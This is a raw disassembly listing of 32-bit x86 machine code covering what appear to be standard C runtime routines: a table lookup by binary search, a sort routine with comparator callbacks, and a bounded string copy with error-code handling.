  40a87a:	ff 70 08             	push   0x8(%eax)
  40a87d:	e8 c3 e4 ff ff       	call   0x408d45
  40a882:	83 c4 18             	add    $0x18,%esp
  40a885:	85 c0                	test   %eax,%eax
  40a887:	75 0e                	jne    0x40a897
  40a889:	e8 2d cc ff ff       	call   0x4074bb
  40a88e:	c7 00 2a 00 00 00    	movl   $0x2a,(%eax)
  40a894:	83 ce ff             	or     $0xffffffff,%esi
  40a897:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  40a89b:	74 0a                	je     0x40a8a7
  40a89d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40a8a0:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  40a8a7:	8b c6                	mov    %esi,%eax
  40a8a9:	5e                   	pop    %esi
  40a8aa:	eb 10                	jmp    0x40a8bc
  40a8ac:	83 25 f8 72 41 00 00 	andl   $0x0,0x4172f8
  40a8b3:	83 25 fc 72 41 00 00 	andl   $0x0,0x4172fc
  40a8ba:	33 c0                	xor    %eax,%eax
  40a8bc:	5f                   	pop    %edi
  40a8bd:	5b                   	pop    %ebx
  40a8be:	c9                   	leave
  40a8bf:	c3                   	ret
  40a8c0:	8b ff                	mov    %edi,%edi
  40a8c2:	55                   	push   %ebp
  40a8c3:	8b ec                	mov    %esp,%ebp
  40a8c5:	6a 00                	push   $0x0
  40a8c7:	ff 75 10             	push   0x10(%ebp)
  40a8ca:	ff 75 0c             	push   0xc(%ebp)
  40a8cd:	ff 75 08             	push   0x8(%ebp)
  40a8d0:	e8 a9 fe ff ff       	call   0x40a77e
  40a8d5:	83 c4 10             	add    $0x10,%esp
  40a8d8:	5d                   	pop    %ebp
  40a8d9:	c3                   	ret
  40a8da:	8b ff                	mov    %edi,%edi
  40a8dc:	55                   	push   %ebp
  40a8dd:	8b ec                	mov    %esp,%ebp
  40a8df:	8b 45 08             	mov    0x8(%ebp),%eax
  40a8e2:	85 c0                	test   %eax,%eax
  40a8e4:	75 15                	jne    0x40a8fb
  40a8e6:	e8 d0 cb ff ff       	call   0x4074bb
  40a8eb:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40a8f1:	e8 08 cb ff ff       	call   0x4073fe
  40a8f6:	83 c8 ff             	or     $0xffffffff,%eax
  40a8f9:	5d                   	pop    %ebp
  40a8fa:	c3                   	ret
  40a8fb:	8b 40 10             	mov    0x10(%eax),%eax
  40a8fe:	90                   	nop
  40a8ff:	5d                   	pop    %ebp
  40a900:	c3                   	ret
  40a901:	8b ff                	mov    %edi,%edi
  40a903:	55                   	push   %ebp
  40a904:	8b ec                	mov    %esp,%ebp
  40a906:	53                   	push   %ebx
  40a907:	56                   	push   %esi
  40a908:	57                   	push   %edi
  40a909:	33 ff                	xor    %edi,%edi
  40a90b:	bb e3 00 00 00       	mov    $0xe3,%ebx
  40a910:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  40a913:	99                   	cltd
  40a914:	2b c2                	sub    %edx,%eax
  40a916:	8b f0                	mov    %eax,%esi
  40a918:	d1 fe                	sar    $1,%esi
  40a91a:	6a 55                	push   $0x55
  40a91c:	ff 34 f5 b8 21 41 00 	push   0x4121b8(,%esi,8)
  40a923:	ff 75 08             	push   0x8(%ebp)
  40a926:	e8 b8 af ff ff       	call   0x4058e3
  40a92b:	83 c4 0c             	add    $0xc,%esp
  40a92e:	85 c0                	test   %eax,%eax
  40a930:	74 13                	je     0x40a945
  40a932:	79 05                	jns    0x40a939
  40a934:	8d 5e ff             	lea    -0x1(%esi),%ebx
  40a937:	eb 03                	jmp    0x40a93c
  40a939:	8d 7e 01             	lea    0x1(%esi),%edi
  40a93c:	3b fb                	cmp    %ebx,%edi
  40a93e:	7e d0                	jle    0x40a910
  40a940:	83 c8 ff             	or     $0xffffffff,%eax
  40a943:	eb 07                	jmp    0x40a94c
  40a945:	8b 04 f5 bc 21 41 00 	mov    0x4121bc(,%esi,8),%eax
  40a94c:	5f                   	pop    %edi
  40a94d:	5e                   	pop    %esi
  40a94e:	5b                   	pop    %ebx
  40a94f:	5d                   	pop    %ebp
  40a950:	c3                   	ret
  40a951:	8b ff                	mov    %edi,%edi
  40a953:	55                   	push   %ebp
  40a954:	8b ec                	mov    %esp,%ebp
  40a956:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40a95a:	74 1d                	je     0x40a979
  40a95c:	ff 75 08             	push   0x8(%ebp)
  40a95f:	e8 9d ff ff ff       	call   0x40a901
  40a964:	59                   	pop    %ecx
  40a965:	85 c0                	test   %eax,%eax
  40a967:	78 10                	js     0x40a979
  40a969:	3d e4 00 00 00       	cmp    $0xe4,%eax
  40a96e:	73 09                	jae    0x40a979
  40a970:	8b 04 c5 98 10 41 00 	mov    0x411098(,%eax,8),%eax
  40a977:	5d                   	pop    %ebp
  40a978:	c3                   	ret
  40a979:	33 c0                	xor    %eax,%eax
  40a97b:	5d                   	pop    %ebp
  40a97c:	c3                   	ret
  40a97d:	cc                   	int3
  40a97e:	cc                   	int3
  40a97f:	cc                   	int3
  40a980:	8b ff                	mov    %edi,%edi
  40a982:	55                   	push   %ebp
  40a983:	8b ec                	mov    %esp,%ebp
  40a985:	81 ec 18 01 00 00    	sub    $0x118,%esp
  40a98b:	a1 04 60 41 00       	mov    0x416004,%eax
  40a990:	33 c5                	xor    %ebp,%eax
  40a992:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40a995:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40a998:	53                   	push   %ebx
  40a999:	8b 5d 14             	mov    0x14(%ebp),%ebx
  40a99c:	56                   	push   %esi
  40a99d:	8b 75 08             	mov    0x8(%ebp),%esi
  40a9a0:	89 b5 fc fe ff ff    	mov    %esi,-0x104(%ebp)
  40a9a6:	89 9d f8 fe ff ff    	mov    %ebx,-0x108(%ebp)
  40a9ac:	57                   	push   %edi
  40a9ad:	8b 7d 10             	mov    0x10(%ebp),%edi
  40a9b0:	89 bd 00 ff ff ff    	mov    %edi,-0x100(%ebp)
  40a9b6:	85 f6                	test   %esi,%esi
  40a9b8:	75 25                	jne    0x40a9df
  40a9ba:	85 c9                	test   %ecx,%ecx
  40a9bc:	74 21                	je     0x40a9df
  40a9be:	e8 f8 ca ff ff       	call   0x4074bb
  40a9c3:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40a9c9:	e8 30 ca ff ff       	call   0x4073fe
  40a9ce:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40a9d1:	5f                   	pop    %edi
  40a9d2:	5e                   	pop    %esi
  40a9d3:	33 cd                	xor    %ebp,%ecx
  40a9d5:	5b                   	pop    %ebx
  40a9d6:	e8 6a 8d ff ff       	call   0x403745
  40a9db:	8b e5                	mov    %ebp,%esp
  40a9dd:	5d                   	pop    %ebp
  40a9de:	c3                   	ret
  40a9df:	85 ff                	test   %edi,%edi
  40a9e1:	74 db                	je     0x40a9be
  40a9e3:	85 db                	test   %ebx,%ebx
  40a9e5:	74 d7                	je     0x40a9be
  40a9e7:	c7 85 e8 fe ff ff 00 	movl   $0x0,-0x118(%ebp)
  40a9ee:	00 00 00 
  40a9f1:	83 f9 02             	cmp    $0x2,%ecx
  40a9f4:	72 d8                	jb     0x40a9ce
  40a9f6:	49                   	dec    %ecx
  40a9f7:	0f af cf             	imul   %edi,%ecx
  40a9fa:	03 ce                	add    %esi,%ecx
  40a9fc:	89 8d 08 ff ff ff    	mov    %ecx,-0xf8(%ebp)
  40aa02:	8b c1                	mov    %ecx,%eax
  40aa04:	33 d2                	xor    %edx,%edx
  40aa06:	2b c6                	sub    %esi,%eax
  40aa08:	f7 f7                	div    %edi
  40aa0a:	40                   	inc    %eax
  40aa0b:	83 f8 08             	cmp    $0x8,%eax
  40aa0e:	0f 87 b6 00 00 00    	ja     0x40aaca
  40aa14:	3b ce                	cmp    %esi,%ecx
  40aa16:	0f 86 27 04 00 00    	jbe    0x40ae43
  40aa1c:	8d 14 37             	lea    (%edi,%esi,1),%edx
  40aa1f:	89 95 f0 fe ff ff    	mov    %edx,-0x110(%ebp)
  40aa25:	8b c6                	mov    %esi,%eax
  40aa27:	8b f2                	mov    %edx,%esi
  40aa29:	89 85 04 ff ff ff    	mov    %eax,-0xfc(%ebp)
  40aa2f:	3b f1                	cmp    %ecx,%esi
  40aa31:	77 2f                	ja     0x40aa62
  40aa33:	50                   	push   %eax
  40aa34:	56                   	push   %esi
  40aa35:	8b cb                	mov    %ebx,%ecx
  40aa37:	ff 15 24 f2 40 00    	call   *0x40f224
  40aa3d:	ff d3                	call   *%ebx
  40aa3f:	83 c4 08             	add    $0x8,%esp
  40aa42:	85 c0                	test   %eax,%eax
  40aa44:	7e 0a                	jle    0x40aa50
  40aa46:	8b c6                	mov    %esi,%eax
  40aa48:	89 85 04 ff ff ff    	mov    %eax,-0xfc(%ebp)
  40aa4e:	eb 06                	jmp    0x40aa56
  40aa50:	8b 85 04 ff ff ff    	mov    -0xfc(%ebp),%eax
  40aa56:	8b 8d 08 ff ff ff    	mov    -0xf8(%ebp),%ecx
  40aa5c:	03 f7                	add    %edi,%esi
  40aa5e:	3b f1                	cmp    %ecx,%esi
  40aa60:	76 d1                	jbe    0x40aa33
  40aa62:	89 bd f4 fe ff ff    	mov    %edi,-0x10c(%ebp)
  40aa68:	8b d1                	mov    %ecx,%edx
  40aa6a:	3b c1                	cmp    %ecx,%eax
  40aa6c:	74 3b                	je     0x40aaa9
  40aa6e:	2b c1                	sub    %ecx,%eax
  40aa70:	8b df                	mov    %edi,%ebx
  40aa72:	89 85 04 ff ff ff    	mov    %eax,-0xfc(%ebp)
  40aa78:	eb 06                	jmp    0x40aa80
  40aa7a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  40aa80:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  40aa83:	8d 52 01             	lea    0x1(%edx),%edx
  40aa86:	8b b5 04 ff ff ff    	mov    -0xfc(%ebp),%esi
  40aa8c:	8a 42 ff             	mov    -0x1(%edx),%al
  40aa8f:	88 44 16 ff          	mov    %al,-0x1(%esi,%edx,1)
  40aa93:	8b c6                	mov    %esi,%eax
  40aa95:	88 4a ff             	mov    %cl,-0x1(%edx)
  40aa98:	83 eb 01             	sub    $0x1,%ebx
  40aa9b:	75 e3                	jne    0x40aa80
  40aa9d:	8b 9d f8 fe ff ff    	mov    -0x108(%ebp),%ebx
  40aaa3:	8b 8d 08 ff ff ff    	mov    -0xf8(%ebp),%ecx
  40aaa9:	8b b5 fc fe ff ff    	mov    -0x104(%ebp),%esi
  40aaaf:	2b cf                	sub    %edi,%ecx
  40aab1:	8b 95 f0 fe ff ff    	mov    -0x110(%ebp),%edx
  40aab7:	89 8d 08 ff ff ff    	mov    %ecx,-0xf8(%ebp)
  40aabd:	3b ce                	cmp    %esi,%ecx
  40aabf:	0f 87 60 ff ff ff    	ja     0x40aa25
  40aac5:	e9 79 03 00 00       	jmp    0x40ae43
  40aaca:	d1 e8                	shr    $1,%eax
  40aacc:	8b cb                	mov    %ebx,%ecx
  40aace:	0f af c7             	imul   %edi,%eax
  40aad1:	89 85 04 ff ff ff    	mov    %eax,-0xfc(%ebp)
  40aad7:	8d 3c 30             	lea    (%eax,%esi,1),%edi
  40aada:	57                   	push   %edi
  40aadb:	56                   	push   %esi
  40aadc:	89 bd ec fe ff ff    	mov    %edi,-0x114(%ebp)
  40aae2:	ff 15 24 f2 40 00    	call   *0x40f224
  40aae8:	ff d3                	call   *%ebx
  40aaea:	8b b5 00 ff ff ff    	mov    -0x100(%ebp),%esi
  40aaf0:	83 c4 08             	add    $0x8,%esp
  40aaf3:	85 c0                	test   %eax,%eax
  40aaf5:	8b 85 fc fe ff ff    	mov    -0x104(%ebp),%eax
  40aafb:	7e 4d                	jle    0x40ab4a
  40aafd:	89 b5 f4 fe ff ff    	mov    %esi,-0x10c(%ebp)
  40ab03:	89 bd f0 fe ff ff    	mov    %edi,-0x110(%ebp)
  40ab09:	3b c7                	cmp    %edi,%eax
  40ab0b:	74 3d                	je     0x40ab4a
  40ab0d:	8b 9d f4 fe ff ff    	mov    -0x10c(%ebp),%ebx
  40ab13:	8b f7                	mov    %edi,%esi
  40ab15:	8b bd 04 ff ff ff    	mov    -0xfc(%ebp),%edi
  40ab1b:	eb 03                	jmp    0x40ab20
  40ab1d:	8d 49 00             	lea    0x0(%ecx),%ecx
  40ab20:	8a 06                	mov    (%esi),%al
  40ab22:	8b d6                	mov    %esi,%edx
  40ab24:	2b d7                	sub    %edi,%edx
  40ab26:	8a 0a                	mov    (%edx),%cl
  40ab28:	88 02                	mov    %al,(%edx)
  40ab2a:	88 0e                	mov    %cl,(%esi)
  40ab2c:	46                   	inc    %esi
  40ab2d:	83 eb 01             	sub    $0x1,%ebx
  40ab30:	75 ee                	jne    0x40ab20
  40ab32:	8b bd ec fe ff ff    	mov    -0x114(%ebp),%edi
  40ab38:	8b 9d f8 fe ff ff    	mov    -0x108(%ebp),%ebx
  40ab3e:	8b b5 00 ff ff ff    	mov    -0x100(%ebp),%esi
  40ab44:	8b 85 fc fe ff ff    	mov    -0x104(%ebp),%eax
  40ab4a:	ff b5 08 ff ff ff    	push   -0xf8(%ebp)
  40ab50:	8b cb                	mov    %ebx,%ecx
  40ab52:	50                   	push   %eax
  40ab53:	ff 15 24 f2 40 00    	call   *0x40f224
  40ab59:	ff d3                	call   *%ebx
  40ab5b:	8b 95 08 ff ff ff    	mov    -0xf8(%ebp),%edx
  40ab61:	83 c4 08             	add    $0x8,%esp
  40ab64:	85 c0                	test   %eax,%eax
  40ab66:	7e 49                	jle    0x40abb1
  40ab68:	8b 85 fc fe ff ff    	mov    -0x104(%ebp),%eax
  40ab6e:	89 b5 ec fe ff ff    	mov    %esi,-0x114(%ebp)
  40ab74:	8b f2                	mov    %edx,%esi
  40ab76:	3b c2                	cmp    %edx,%eax
  40ab78:	74 37                	je     0x40abb1
  40ab7a:	8b 9d ec fe ff ff    	mov    -0x114(%ebp),%ebx
  40ab80:	2b c2                	sub    %edx,%eax
  40ab82:	89 85 f0 fe ff ff    	mov    %eax,-0x110(%ebp)
  40ab88:	8b d0                	mov    %eax,%edx
  40ab8a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  40ab90:	8a 06                	mov    (%esi),%al
  40ab92:	8d 76 01             	lea    0x1(%esi),%esi
  40ab95:	8a 4c 32 ff          	mov    -0x1(%edx,%esi,1),%cl
  40ab99:	88 44 32 ff          	mov    %al,-0x1(%edx,%esi,1)
  40ab9d:	88 4e ff             	mov    %cl,-0x1(%esi)
  40aba0:	83 eb 01             	sub    $0x1,%ebx
  40aba3:	75 eb                	jne    0x40ab90
  40aba5:	8b 9d f8 fe ff ff    	mov    -0x108(%ebp),%ebx
  40abab:	8b 95 08 ff ff ff    	mov    -0xf8(%ebp),%edx
  40abb1:	52                   	push   %edx
  40abb2:	57                   	push   %edi
  40abb3:	8b cb                	mov    %ebx,%ecx
  40abb5:	ff 15 24 f2 40 00    	call   *0x40f224
  40abbb:	ff d3                	call   *%ebx
  40abbd:	8b 95 08 ff ff ff    	mov    -0xf8(%ebp),%edx
  40abc3:	83 c4 08             	add    $0x8,%esp
  40abc6:	85 c0                	test   %eax,%eax
  40abc8:	8b 85 00 ff ff ff    	mov    -0x100(%ebp),%eax
  40abce:	7e 35                	jle    0x40ac05
  40abd0:	8b d8                	mov    %eax,%ebx
  40abd2:	8b f2                	mov    %edx,%esi
  40abd4:	3b fa                	cmp    %edx,%edi
  40abd6:	74 2d                	je     0x40ac05
  40abd8:	8b c7                	mov    %edi,%eax
  40abda:	2b c2                	sub    %edx,%eax
  40abdc:	89 85 ec fe ff ff    	mov    %eax,-0x114(%ebp)
  40abe2:	8b d0                	mov    %eax,%edx
  40abe4:	8a 06                	mov    (%esi),%al
  40abe6:	8d 76 01             	lea    0x1(%esi),%esi
  40abe9:	8a 4c 32 ff          	mov    -0x1(%edx,%esi,1),%cl
  40abed:	88 44 32 ff          	mov    %al,-0x1(%edx,%esi,1)
  40abf1:	88 4e ff             	mov    %cl,-0x1(%esi)
  40abf4:	83 eb 01             	sub    $0x1,%ebx
  40abf7:	75 eb                	jne    0x40abe4
  40abf9:	8b 85 00 ff ff ff    	mov    -0x100(%ebp),%eax
  40abff:	8b 95 08 ff ff ff    	mov    -0xf8(%ebp),%edx
  40ac05:	8b b5 fc fe ff ff    	mov    -0x104(%ebp),%esi
  40ac0b:	8b da                	mov    %edx,%ebx
  40ac0d:	89 95 04 ff ff ff    	mov    %edx,-0xfc(%ebp)
  40ac13:	3b fe                	cmp    %esi,%edi
  40ac15:	76 3e                	jbe    0x40ac55
  40ac17:	eb 07                	jmp    0x40ac20
  40ac19:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40ac20:	03 f0                	add    %eax,%esi
  40ac22:	89 b5 f4 fe ff ff    	mov    %esi,-0x10c(%ebp)
  40ac28:	3b f7                	cmp    %edi,%esi
  40ac2a:	73 23                	jae    0x40ac4f
  40ac2c:	8b 8d f8 fe ff ff    	mov    -0x108(%ebp),%ecx
  40ac32:	57                   	push   %edi
  40ac33:	56                   	push   %esi
  40ac34:	ff 15 24 f2 40 00    	call   *0x40f224
  40ac3a:	ff 95 f8 fe ff ff    	call   *-0x108(%ebp)
  40ac40:	83 c4 08             	add    $0x8,%esp
  40ac43:	85 c0                	test   %eax,%eax
  40ac45:	8b 85 00 ff ff ff    	mov    -0x100(%ebp),%eax
  40ac4b:	7e d3                	jle    0x40ac20
  40ac4d:	eb 42                	jmp    0x40ac91
  40ac4f:	8b 95 08 ff ff ff    	mov    -0xf8(%ebp),%edx
  40ac55:	8b 9d f8 fe ff ff    	mov    -0x108(%ebp),%ebx
  40ac5b:	eb 03                	jmp    0x40ac60
  40ac5d:	8d 49 00             	lea    0x0(%ecx),%ecx
  40ac60:	03 f0                	add    %eax,%esi
  40ac62:	3b f2                	cmp    %edx,%esi
  40ac64:	77 1f                	ja     0x40ac85
  40ac66:	57                   	push   %edi
  40ac67:	56                   	push   %esi
  40ac68:	8b cb                	mov    %ebx,%ecx
  40ac6a:	ff 15 24 f2 40 00    	call   *0x40f224
  40ac70:	ff d3                	call   *%ebx
  40ac72:	8b 95 08 ff ff ff    	mov    -0xf8(%ebp),%edx
  40ac78:	83 c4 08             	add    $0x8,%esp
  40ac7b:	85 c0                	test   %eax,%eax
  40ac7d:	8b 85 00 ff ff ff    	mov    -0x100(%ebp),%eax
  40ac83:	7e db                	jle    0x40ac60
  40ac85:	8b 9d 04 ff ff ff    	mov    -0xfc(%ebp),%ebx
  40ac8b:	89 b5 f4 fe ff ff    	mov    %esi,-0x10c(%ebp)
  40ac91:	8b b5 f8 fe ff ff    	mov    -0x108(%ebp),%esi
  40ac97:	eb 07                	jmp    0x40aca0
  40ac99:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40aca0:	8b 85 00 ff ff ff    	mov    -0x100(%ebp),%eax
  40aca6:	8b cb                	mov    %ebx,%ecx
  40aca8:	2b d8                	sub    %eax,%ebx
  40acaa:	89 8d 04 ff ff ff    	mov    %ecx,-0xfc(%ebp)
  40acb0:	3b df                	cmp    %edi,%ebx
  40acb2:	76 1f                	jbe    0x40acd3
  40acb4:	57                   	push   %edi
  40acb5:	53                   	push   %ebx
  40acb6:	8b ce                	mov    %esi,%ecx
  40acb8:	ff 15 24 f2 40 00    	call   *0x40f224
  40acbe:	ff d6                	call   *%esi
  40acc0:	83 c4 08             	add    $0x8,%esp
  40acc3:	85 c0                	test   %eax,%eax
  40acc5:	7f d9                	jg     0x40aca0
  40acc7:	8b 85 00 ff ff ff    	mov    -0x100(%ebp),%eax
  40accd:	8b 8d 04 ff ff ff    	mov    -0xfc(%ebp),%ecx
  40acd3:	8b b5 f4 fe ff ff    	mov    -0x10c(%ebp),%esi
  40acd9:	89 9d 04 ff ff ff    	mov    %ebx,-0xfc(%ebp)
  40acdf:	3b de                	cmp    %esi,%ebx
  40ace1:	72 4a                	jb     0x40ad2d
  40ace3:	89 85 f0 fe ff ff    	mov    %eax,-0x110(%ebp)
  40ace9:	8b d3                	mov    %ebx,%edx
  40aceb:	74 2b                	je     0x40ad18
  40aced:	2b f3                	sub    %ebx,%esi
  40acef:	8b d8                	mov    %eax,%ebx
  40acf1:	8a 02                	mov    (%edx),%al
  40acf3:	8d 52 01             	lea    0x1(%edx),%edx
  40acf6:	8a 4c 16 ff          	mov    -0x1(%esi,%edx,1),%cl
  40acfa:	88 44 16 ff          	mov    %al,-0x1(%esi,%edx,1)
  40acfe:	88 4a ff             	mov    %cl,-0x1(%edx)
  40ad01:	83 eb 01             	sub    $0x1,%ebx
  40ad04:	75 eb                	jne    0x40acf1
  40ad06:	8b b5 f4 fe ff ff    	mov    -0x10c(%ebp),%esi
  40ad0c:	8b 9d 04 ff ff ff    	mov    -0xfc(%ebp),%ebx
  40ad12:	8b 85 00 ff ff ff    	mov    -0x100(%ebp),%eax
  40ad18:	8b 95 08 ff ff ff    	mov    -0xf8(%ebp),%edx
  40ad1e:	3b fb                	cmp    %ebx,%edi
  40ad20:	0f 85 ed fe ff ff    	jne    0x40ac13
  40ad26:	8b fe                	mov    %esi,%edi
  40ad28:	e9 e6 fe ff ff       	jmp    0x40ac13
  40ad2d:	3b f9                	cmp    %ecx,%edi
  40ad2f:	73 3c                	jae    0x40ad6d
  40ad31:	8b 9d f8 fe ff ff    	mov    -0x108(%ebp),%ebx
  40ad37:	eb 07                	jmp    0x40ad40
  40ad39:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40ad40:	2b c8                	sub    %eax,%ecx
  40ad42:	89 8d 04 ff ff ff    	mov    %ecx,-0xfc(%ebp)
  40ad48:	3b cf                	cmp    %edi,%ecx
  40ad4a:	76 21                	jbe    0x40ad6d
  40ad4c:	57                   	push   %edi
  40ad4d:	51                   	push   %ecx
  40ad4e:	8b cb                	mov    %ebx,%ecx
  40ad50:	ff 15 24 f2 40 00    	call   *0x40f224
  40ad56:	ff d3                	call   *%ebx
  40ad58:	8b 8d 04 ff ff ff    	mov    -0xfc(%ebp),%ecx
  40ad5e:	83 c4 08             	add    $0x8,%esp
  40ad61:	85 c0                	test   %eax,%eax
  40ad63:	8b 85 00 ff ff ff    	mov    -0x100(%ebp),%eax
  40ad69:	74 d5                	je     0x40ad40
  40ad6b:	eb 44                	jmp    0x40adb1
  40ad6d:	8b 9d f8 fe ff ff    	mov    -0x108(%ebp),%ebx
  40ad73:	8b b5 fc fe ff ff    	mov    -0x104(%ebp),%esi
  40ad79:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40ad80:	2b c8                	sub    %eax,%ecx
  40ad82:	89 8d 04 ff ff ff    	mov    %ecx,-0xfc(%ebp)
  40ad88:	3b ce                	cmp    %esi,%ecx
  40ad8a:	76 1f                	jbe    0x40adab
  40ad8c:	57                   	push   %edi
  40ad8d:	51                   	push   %ecx
  40ad8e:	8b cb                	mov    %ebx,%ecx
  40ad90:	ff 15 24 f2 40 00    	call   *0x40f224
  40ad96:	ff d3                	call   *%ebx
  40ad98:	8b 8d 04 ff ff ff    	mov    -0xfc(%ebp),%ecx
  40ad9e:	83 c4 08             	add    $0x8,%esp
  40ada1:	85 c0                	test   %eax,%eax
  40ada3:	8b 85 00 ff ff ff    	mov    -0x100(%ebp),%eax
  40ada9:	74 d5                	je     0x40ad80
  40adab:	8b b5 f4 fe ff ff    	mov    -0x10c(%ebp),%esi
  40adb1:	8b 95 08 ff ff ff    	mov    -0xf8(%ebp),%edx
  40adb7:	8b ca                	mov    %edx,%ecx
  40adb9:	8b bd 04 ff ff ff    	mov    -0xfc(%ebp),%edi
  40adbf:	2b ce                	sub    %esi,%ecx
  40adc1:	8b c7                	mov    %edi,%eax
  40adc3:	2b 85 fc fe ff ff    	sub    -0x104(%ebp),%eax
  40adc9:	3b c1                	cmp    %ecx,%eax
  40adcb:	7c 3d                	jl     0x40ae0a
  40adcd:	8b 85 fc fe ff ff    	mov    -0x104(%ebp),%eax
  40add3:	3b c7                	cmp    %edi,%eax
  40add5:	73 18                	jae    0x40adef
  40add7:	8b 8d e8 fe ff ff    	mov    -0x118(%ebp),%ecx
  40addd:	89 44 8d 84          	mov    %eax,-0x7c(%ebp,%ecx,4)
  40ade1:	89 bc 8d 0c ff ff ff 	mov    %edi,-0xf4(%ebp,%ecx,4)
  40ade8:	41                   	inc    %ecx
  40ade9:	89 8d e8 fe ff ff    	mov    %ecx,-0x118(%ebp)
  40adef:	8b 8d 08 ff ff ff    	mov    -0xf8(%ebp),%ecx
  40adf5:	8b bd 00 ff ff ff    	mov    -0x100(%ebp),%edi
  40adfb:	3b f1                	cmp    %ecx,%esi
  40adfd:	73 44                	jae    0x40ae43
  40adff:	89 b5 fc fe ff ff    	mov    %esi,-0x104(%ebp)
  40ae05:	e9 f8 fb ff ff       	jmp    0x40aa02
  40ae0a:	3b f2                	cmp    %edx,%esi
  40ae0c:	73 18                	jae    0x40ae26
  40ae0e:	8b 85 e8 fe ff ff    	mov    -0x118(%ebp),%eax
  40ae14:	89 74 85 84          	mov    %esi,-0x7c(%ebp,%eax,4)
  40ae18:	89 94 85 0c ff ff ff 	mov    %edx,-0xf4(%ebp,%eax,4)
  40ae1f:	40                   	inc    %eax
  40ae20:	89 85 e8 fe ff ff    	mov    %eax,-0x118(%ebp)
  40ae26:	8b b5 fc fe ff ff    	mov    -0x104(%ebp),%esi
  40ae2c:	3b f7                	cmp    %edi,%esi
  40ae2e:	73 0d                	jae    0x40ae3d
  40ae30:	8b cf                	mov    %edi,%ecx
  40ae32:	8b bd 00 ff ff ff    	mov    -0x100(%ebp),%edi
  40ae38:	e9 bf fb ff ff       	jmp    0x40a9fc
  40ae3d:	8b bd 00 ff ff ff    	mov    -0x100(%ebp),%edi
  40ae43:	8b 85 e8 fe ff ff    	mov    -0x118(%ebp),%eax
  40ae49:	83 e8 01             	sub    $0x1,%eax
  40ae4c:	89 85 e8 fe ff ff    	mov    %eax,-0x118(%ebp)
  40ae52:	0f 88 76 fb ff ff    	js     0x40a9ce
  40ae58:	8b 74 85 84          	mov    -0x7c(%ebp,%eax,4),%esi
  40ae5c:	8b 8c 85 0c ff ff ff 	mov    -0xf4(%ebp,%eax,4),%ecx
  40ae63:	89 b5 fc fe ff ff    	mov    %esi,-0x104(%ebp)
  40ae69:	e9 8e fb ff ff       	jmp    0x40a9fc
  40ae6e:	8b ff                	mov    %edi,%edi
  40ae70:	55                   	push   %ebp
  40ae71:	8b ec                	mov    %esp,%ebp
  40ae73:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ae76:	53                   	push   %ebx
  40ae77:	8b 5d 10             	mov    0x10(%ebp),%ebx
  40ae7a:	56                   	push   %esi
  40ae7b:	8b 75 14             	mov    0x14(%ebp),%esi
  40ae7e:	85 f6                	test   %esi,%esi
  40ae80:	75 1e                	jne    0x40aea0
  40ae82:	85 c9                	test   %ecx,%ecx
  40ae84:	75 1e                	jne    0x40aea4
  40ae86:	39 75 0c             	cmp    %esi,0xc(%ebp)
  40ae89:	74 27                	je     0x40aeb2
  40ae8b:	e8 2b c6 ff ff       	call   0x4074bb
  40ae90:	6a 16                	push   $0x16
  40ae92:	5e                   	pop    %esi
  40ae93:	89 30                	mov    %esi,(%eax)
  40ae95:	e8 64 c5 ff ff       	call   0x4073fe
  40ae9a:	8b c6                	mov    %esi,%eax
  40ae9c:	5e                   	pop    %esi
  40ae9d:	5b                   	pop    %ebx
  40ae9e:	5d                   	pop    %ebp
  40ae9f:	c3                   	ret
  40aea0:	85 c9                	test   %ecx,%ecx
  40aea2:	74 e7                	je     0x40ae8b
  40aea4:	8b 45 0c             	mov    0xc(%ebp),%eax
  40aea7:	85 c0                	test   %eax,%eax
  40aea9:	74 e0                	je     0x40ae8b
  40aeab:	85 f6                	test   %esi,%esi
  40aead:	75 07                	jne    0x40aeb6
  40aeaf:	c6 01 00             	movb   $0x0,(%ecx)
  40aeb2:	33 c0                	xor    %eax,%eax
  40aeb4:	eb e6                	jmp    0x40ae9c
  40aeb6:	85 db                	test   %ebx,%ebx
  40aeb8:	75 04                	jne    0x40aebe
  40aeba:	88 19                	mov    %bl,(%ecx)
  40aebc:	eb cd                	jmp    0x40ae8b
  40aebe:	2b d9                	sub    %ecx,%ebx
  40aec0:	8b d1                	mov    %ecx,%edx
  40aec2:	57                   	push   %edi
  40aec3:	8b f8                	mov    %eax,%edi
  40aec5:	83 fe ff             	cmp    $0xffffffff,%esi
  40aec8:	75 11                	jne    0x40aedb
  40aeca:	8a 04 13             	mov    (%ebx,%edx,1),%al
  40aecd:	88 02                	mov    %al,(%edx)
  40aecf:	42                   	inc    %edx
  40aed0:	84 c0                	test   %al,%al
  40aed2:	74 27                	je     0x40aefb
  40aed4:	83 ef 01             	sub    $0x1,%edi
  40aed7:	75 f1                	jne    0x40aeca
  40aed9:	eb 20                	jmp    0x40aefb
  40aedb:	8b ce                	mov    %esi,%ecx
  40aedd:	8a 04 13             	mov    (%ebx,%edx,1),%al
  40aee0:	88 02                	mov    %al,(%edx)
  40aee2:	42                   	inc    %edx
  40aee3:	84 c0                	test   %al,%al
  40aee5:	74 0a                	je     0x40aef1
  40aee7:	83 ef 01             	sub    $0x1,%edi
  40aeea:	74 05                	je     0x40aef1
  40aeec:	83 e9 01             	sub    $0x1,%ecx
  40aeef:	75 ec                	jne    0x40aedd
  40aef1:	85 c9                	test   %ecx,%ecx
  40aef3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40aef6:	75 03                	jne    0x40aefb
  40aef8:	c6 02 00             	movb   $0x0,(%edx)
  40aefb:	85 ff                	test   %edi,%edi
  40aefd:	5f                   	pop    %edi
